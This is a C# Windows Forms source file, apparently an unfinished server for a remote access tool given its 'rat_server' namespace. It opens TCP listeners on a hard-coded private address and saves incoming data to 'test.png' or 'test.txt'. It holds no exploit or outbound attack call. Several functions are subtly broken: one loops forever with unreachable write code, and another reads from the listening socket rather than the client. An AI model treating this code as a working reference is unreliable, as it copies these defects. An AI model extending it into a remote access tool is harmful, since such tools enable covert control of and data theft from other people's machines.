using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using Ionic.Zip;

namespace rat_server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static void ExampleServer() {
            // Establish the local endpoint  
            // for the socket. Dns.GetHostName 
            // returns the name of the host  
            // running the application. 
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr = IPAddress.Parse("172.31.244.16");
            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);

            // Creation TCP/IP Socket using  
            // Socket Class Costructor 
            Socket listener = new Socket(ipAddr.AddressFamily,
                         SocketType.Stream, ProtocolType.Tcp);

            try
            {

                // Using Bind() method we associate a 
                // network address to the Server Socket 
                // All client that will connect to this  
                // Server Socket must know this network 
                // Address 
                listener.Bind(localEndPoint);

                // Using Listen() method we create  
                // the Client list that will want 
                // to connect to Server 
                listener.Listen(10);

                while (true)
                {

                    Console.WriteLine("Waiting connection ... ");

                    // Suspend while waiting for 
                    // incoming connection Using  
                    // Accept() method the server  
                    // will accept connection of client 
                    Socket clientSocket = listener.Accept();

                    int size = 500000;
                    var fileBuffer = new byte[size];
                    var receiveBuffer = new byte[2048];
                    var bytesLeftToReceive = size;
                    var fileOffset = 0;
                    while (bytesLeftToReceive > 0)
                    {
                        //receive
                        var bytesRead = clientSocket.Receive(receiveBuffer);
                        if (bytesRead == 0)
                            throw new InvalidOperationException("Remote endpoint disconnected");
                        //if the socket is used for other things after the file transfer
                        //we need to make sure that we do not copy that data
                        //to the file
                        int bytesToCopy = Math.Min(bytesRead, bytesLeftToReceive);
                        // copy data from our socket buffer to the file buffer.
                        //Buffer.BlockCopy(receiveBuffer, 0, bytesLeftToReceive, fileBuffer, fileOffset);
                        Buffer.BlockCopy(receiveBuffer, 0, fileBuffer, fileOffset, bytesToCopy);
                        //move forward in the file buffer
                        fileOffset += bytesToCopy;
                        //update our tracker.
                        bytesLeftToReceive -= bytesToCopy;
                    }

                    File.WriteAllBytes("test.png", fileBuffer);

                    //byte[] bytes = new Byte[1000000];
                    //string data = null;
                    //int numByte = clientSocket.Receive(bytes);
                    //while (true)
                    //{
                    //    using (var fs = new FileStream("test.png", FileMode.Create, FileAccess.Write))
                    //    {
                    //        fs.Write(bytes, 0, numByte);

                    //    }
                    //    break;
                    //}

                    Console.WriteLine("We done");
                    
                    //Console.WriteLine("Text received -> {0} ", data);
                    //byte[] message = Encoding.ASCII.GetBytes("Test Server");

                    // Send a message to Client  
                    // using Send() method 
                    //clientSocket.Send(message);

                    // Close client Socket using the 
                    // Close() method. After closing, 
                    // we can use the closed Socket  
                    // for a new Client Connection 
                    clientSocket.Shutdown(SocketShutdown.Both);
                    clientSocket.Close();
                }
            
            }

            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }


    
        public static void Server()
        {
            // Establish the local endpoint  
            // for the socket. Dns.GetHostName 
            // returns the name of the host  
            // running the application. 
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr = ipHost.AddressList[3];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);

            // Creation TCP/IP Socket using  
            // Socket Class Costructor 
            Socket listener = new Socket(ipAddr.AddressFamily,
                         SocketType.Stream, ProtocolType.Tcp);

            try
            {

                // Using Bind() method we associate a 
                // network address to the Server Socket 
                // All client that will connect to this  
                // Server Socket must know this network 
                // Address 
                listener.Bind(localEndPoint);

                // Using Listen() method we create  
                // the Client list that will want 
                // to connect to Server 
                listener.Listen(10);

                while (true)
                {

                    Console.WriteLine("Waiting connection ... ");

                    // Suspend while waiting for 
                    // incoming connection Using  
                    // Accept() method the server  
                    // will accept connection of client 
                    Socket clientSocket = listener.Accept();

                    byte[] bytes = new byte[2048];
                    int bytesRead;
                    var output = File.Create("test.txt") ; 
                    while (true) {
                            clientSocket.Receive(bytes);                 
                    }
                    output.Write(bytes, 0, bytesRead);

                    //using (var output = File.Create("test.txt"))
                    //{
                    //    Console.WriteLine("Client connected. Starting to receive the file");

                    //    // read the file in chunks of 1KB
                    //    var buffer = new byte[2048];
                    //    int bytesRead;
                    //    while ((bytesRead = listener.Receive(buffer, 0, SocketFlags.None)) > 0)
                    //    {
                    //        output.Write(buffer, 0, bytesRead);
                    //    }
                    //}

                    Console.WriteLine("We Done");
                    
                    clientSocket.Shutdown(SocketShutdown.Both);
                    clientSocket.Close();
                }
            }

            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }



        public static void ExecuteServer()
        {
            int port_num = 8000;
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr = ipHost.AddressList[3];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, port_num);


            // Creation TCP/IP Socket using  
            // Socket Class Costructor 
            Socket sock = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            try
            {

                // Using Bind() method we associate a 
                // network address to the Server Socket 
                // All client that will connect to this  
                // Server Socket must know this network 
                // Address 
                sock.Bind(localEndPoint);

                // Using Listen() method we create  
                // the Client list that will want 
                // to connect to Server 
                sock.Listen(1000);

                while (true)
                {

                    Console.WriteLine("Waiting connection ... ");

                    // Suspend while waiting for 
                    // incoming connection Using  
                    // Accept() method the server  
                    // will accept connection of client 
                    Socket clientSocket = sock.Accept();

                    // Data buffer 
                    byte[] bytes = new Byte[1024];
                    string data = null;

                    while (true)
                    {

                        int numByte = sock.Receive(bytes);

                        data += Encoding.ASCII.GetString(bytes,
                                                   0, numByte);

                        if (data.IndexOf("<EOF>") > -1)
                            break;
                    }

                    Console.WriteLine("Text received -> {0} ", data);
                    byte[] message = Encoding.ASCII.GetBytes("Test Server");

                    // Send a message to Client  
                    // using Send() method 
                    //sock.Send(message);

                    // Close client Socket using the 
                    // Close() method. After closing, 
                    // we can use the closed Socket  
                    // for a new Client Connection 
                    sock.Shutdown(SocketShutdown.Both);
                    sock.Close();
                    break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);

            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            //  ExecuteServer();
        }

        private void Button1_Click(object sender, EventArgs e)
        {

        }

        private void Label2_Click(object sender, EventArgs e)
        {

        }

        private void TextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            ExampleServer();
        }
    }
}
